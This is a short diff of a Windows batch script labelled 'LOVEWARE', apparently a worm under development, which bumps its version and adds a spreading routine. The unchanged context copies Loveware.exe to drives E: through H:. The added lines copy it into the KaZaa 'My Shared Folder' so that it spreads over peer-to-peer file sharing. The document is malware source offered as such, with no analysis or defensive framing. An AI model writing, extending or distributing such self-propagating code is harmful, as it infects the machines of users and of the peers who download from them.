@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v7.0
+:: LOVEWARE v7.2
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -270,6 +270,10 @@ xcopy /e /y Loveware.exe E:\
 xcopy /e /y Loveware.exe F:\
 xcopy /e /y Loveware.exe G:\
 xcopy /e /y Loveware.exe H:\
+
+:: Use KaZaa to spread if the user has this ancient stuff
+
+xcopy Loveware.exe C:\Program Files\KaZaa\My Shared Folder\
 
 :: Keyboard reg
 
